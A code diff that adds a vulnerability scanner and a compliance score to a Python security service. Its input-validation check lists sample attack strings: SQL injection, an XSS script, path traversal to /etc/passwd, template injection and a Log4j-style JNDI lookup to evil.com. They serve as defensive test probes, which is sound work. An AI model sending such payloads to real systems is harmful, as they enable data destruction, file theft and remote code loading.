@@ -360,14 +360,132 @@ class JWTManager:
             logger.warning("Attempted to revoke invalid token")
 
 
+class VulnerabilityScanner:
+    """Vulnerability scanning and security assessment."""
+
+    def __init__(self):
+        self.scan_results: List[Dict[str, Any]] = []
+        self.last_scan_time: Optional[datetime] = None
+
+    async def run_security_scan(self) -> Dict[str, Any]:
+        """Run comprehensive security scan."""
+        scan_start = datetime.now()
+        vulnerabilities = []
+
+        # Check for common security issues
+        vulnerabilities.extend(await self._check_dependency_vulnerabilities())
+        vulnerabilities.extend(await self._check_configuration_security())
+        vulnerabilities.extend(await self._check_input_validation())
+        vulnerabilities.extend(await self._check_authentication_security())
+
+        scan_result = {
+            'scan_id': secrets.token_urlsafe(16),
+            'timestamp': scan_start.isoformat(),
+            'duration_seconds': (datetime.now() - scan_start).total_seconds(),
+            'vulnerabilities': vulnerabilities,
+            'total_issues': len(vulnerabilities),
+            'critical_issues': len([v for v in vulnerabilities if v['severity'] == 'critical']),
+            'high_issues': len([v for v in vulnerabilities if v['severity'] == 'high']),
+            'medium_issues': len([v for v in vulnerabilities if v['severity'] == 'medium']),
+            'low_issues': len([v for v in vulnerabilities if v['severity'] == 'low'])
+        }
+
+        self.scan_results.append(scan_result)
+        self.last_scan_time = scan_start
+
+        logger.info("Security scan completed",
+                   total_issues=scan_result['total_issues'],
+                   critical_issues=scan_result['critical_issues'])
+
+        return scan_result
+
+    async def _check_dependency_vulnerabilities(self) -> List[Dict[str, Any]]:
+        """Check for known dependency vulnerabilities."""
+        vulnerabilities = []
+
+        # This would integrate with tools like Safety, Bandit, etc.
+        # For now, return placeholder results
+
+        return vulnerabilities
+
+    async def _check_configuration_security(self) -> List[Dict[str, Any]]:
+        """Check security configuration."""
+        vulnerabilities = []
+
+        # Check JWT configuration
+        if SECURITY_CONFIG['jwt_expiry_minutes'] > 60:
+            vulnerabilities.append({
+                'type': 'configuration',
+                'severity': 'medium',
+                'title': 'JWT token expiry too long',
+                'description': 'JWT tokens expire after more than 1 hour',
+                'recommendation': 'Reduce JWT expiry time to 60 minutes or less'
+            })
+
+        # Check rate limiting
+        if SECURITY_CONFIG['rate_limit_requests'] > 1000:
+            vulnerabilities.append({
+                'type': 'configuration',
+                'severity': 'low',
+                'title': 'Rate limit too permissive',
+                'description': 'Rate limit allows more than 1000 requests per window',
+                'recommendation': 'Consider reducing rate limit for better protection'
+            })
+
+        return vulnerabilities
+
+    async def _check_input_validation(self) -> List[Dict[str, Any]]:
+        """Check input validation security."""
+        vulnerabilities = []
+
+        # Test input validation with known attack patterns
+        test_inputs = [
+            "'; DROP TABLE users; --",
+            "<script>alert('xss')</script>",
+            "../../etc/passwd",
+            "{{7*7}}",  # Template injection
+            "${jndi:ldap://evil.com/a}"  # Log4j style
+        ]
+
+        validator = InputValidator()
+        for test_input in test_inputs:
+            if validator.validate_input(test_input):
+                vulnerabilities.append({
+                    'type': 'input_validation',
+                    'severity': 'high',
+                    'title': 'Input validation bypass',
+                    'description': f'Malicious input not detected: {test_input[:50]}...',
+                    'recommendation': 'Strengthen input validation patterns'
+                })
+
+        return vulnerabilities
+
+    async def _check_authentication_security(self) -> List[Dict[str, Any]]:
+        """Check authentication security."""
+        vulnerabilities = []
+
+        # Check for weak secret keys (this would be more sophisticated in practice)
+        if len(SECURITY_CONFIG.get('jwt_secret_key', '')) < 32:
+            vulnerabilities.append({
+                'type': 'authentication',
+                'severity': 'critical',
+                'title': 'Weak JWT secret key',
+                'description': 'JWT secret key is too short',
+                'recommendation': 'Use a secret key of at least 32 characters'
+            })
+
+        return vulnerabilities
+
+
 class SecurityComplianceService:
     """Main security compliance service."""
-    
+
     def __init__(self, secret_key: str):
         self.jwt_manager = JWTManager(secret_key)
         self.rate_limiter = RateLimiter()
         self.audit_logger = AuditLogger()
         self.input_validator = InputValidator()
+        self.vulnerability_scanner = VulnerabilityScanner()
     
     def get_client_ip(self, request: Request) -> str:
         """Extract client IP address from request."""
@@ -458,12 +576,45 @@ class SecurityComplianceService:
         
         return data
     
+    async def run_security_scan(self) -> Dict[str, Any]:
+        """Run comprehensive security vulnerability scan."""
+        return await self.vulnerability_scanner.run_security_scan()
+
+    def get_latest_scan_results(self) -> Optional[Dict[str, Any]]:
+        """Get latest security scan results."""
+        if self.vulnerability_scanner.scan_results:
+            return self.vulnerability_scanner.scan_results[-1]
+        return None
+
+    def get_security_compliance_score(self) -> float:
+        """Calculate security compliance score (0-100)."""
+        latest_scan = self.get_latest_scan_results()
+        if not latest_scan:
+            return 0.0
+
+        total_issues = latest_scan['total_issues']
+        critical_issues = latest_scan['critical_issues']
+        high_issues = latest_scan['high_issues']
+
+        # Calculate score based on severity of issues
+        if critical_issues > 0:
+            return max(0.0, 50.0 - (critical_issues * 10))
+        elif high_issues > 0:
+            return max(50.0, 80.0 - (high_issues * 5))
+        elif total_issues > 0:
+            return max(80.0, 95.0 - (total_issues * 2))
+        else:
+            return 100.0
+
     def get_security_summary(self) -> Dict[str, Any]:
         """Get security compliance summary."""
         recent_events = self.audit_logger.get_events(hours=24)
-        
+        latest_scan = self.get_latest_scan_results()
+        compliance_score = self.get_security_compliance_score()
+
         return {
             'timestamp': datetime.now().isoformat(),
+            'compliance_score': compliance_score,
             'total_events_24h': len(recent_events),
             'security_events_by_severity': {
                 'critical': len([e for e in recent_events if e.severity == 'critical']),
@@ -474,7 +625,13 @@ class SecurityComplianceService:
             'failed_events': len([e for e in recent_events if not e.success]),
             'rate_limit_violations': len([e for e in recent_events if e.event_type == 'rate_limit_exceeded']),
             'authentication_failures': len([e for e in recent_events if e.event_type == 'authentication_failed']),
-            'authorization_failures': len([e for e in recent_events if e.event_type == 'authorization_failed'])
+            'authorization_failures': len([e for e in recent_events if e.event_type == 'authorization_failed']),
+            'latest_vulnerability_scan': {
+                'timestamp': latest_scan['timestamp'] if latest_scan else None,
+                'total_vulnerabilities': latest_scan['total_issues'] if latest_scan else 0,
+                'critical_vulnerabilities': latest_scan['critical_issues'] if latest_scan else 0,
+                'scan_duration': latest_scan['duration_seconds'] if latest_scan else 0
+            }
         }
 
 
